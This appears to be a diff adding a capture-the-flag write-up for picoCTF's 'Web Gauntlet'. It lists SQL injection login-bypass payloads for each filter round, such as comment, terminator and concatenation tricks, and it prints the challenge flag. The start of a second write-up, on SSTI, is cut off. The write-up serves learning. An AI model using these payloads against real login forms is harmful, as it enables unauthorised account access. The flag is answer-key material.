@@ -1,3 +1,68 @@
+# Web Gauntlet
+> Can you beat the filters?
+Log in as admin http://shape-facility.picoctf.net:65336/ http://shape-facility.picoctf.net:65336/filter.php
+
+## Solution:
+
+### round 1 (blocked: or)
+- input random into the field to see what happens
+<img width="998" height="716" alt="image" src="https://github.com/user-attachments/assets/ec08a20d-f917-46b7-8c02-f3996be3a1b2" />
+
+- From this we can interpret that the website uses SQL
+- we simply use `--` to comment out the rest of the code. user - `admin' --` 
+```
+SELECT * FROM users WHERE username='admin' --' AND password='a'
+```
+
+### round 2 (blocked:  or and like = --)
+- here `--` is blocked but we have another way to comment - `/*`to start the comment and  `'*/` to end the comment
+```
+admin' /*
+```
+
+### round 3 (blocked: or and = like > < --)
+- `;` can be used to terminate the sql query
+```
+admin';
+```
+
+### round 4 (blocked: or and = like > < -- admin)
+- everything is blocked now
+- concatenation works so I can
+```
+ad'||'min';
+```
+
+### round 5 (blocked: or and = like > < -- union admin)
+- same as round 4
+```
+ad'||'min';
+```
+
+### Final
+checking the filter.php to find the flag 
+`
+// picoCTF{y0u_m4d3_1t_79a0ddc6}
+`
+
+## Flag:
+```
+picoCTF{y0u_m4d3_1t_79a0ddc6}
+```
+
+## Concepts learnt:
+- SQL basic commands
+- Exploiting a database using SQL injection
+
+
+## Resources: 
+- (https://www.w3schools.com/sql/sql_comments.asp)
+- (https://portswigger.net/web-security/sql-injection)
+- (https://owasp.org/www-community/attacks/SQL_Injection)
+
+***
+
+
 # SSTI1
 > I made a cool website where you can announce whatever you want! Try it out!
 I heard templating is a cool and modular way to build web apps! Check out my website here!
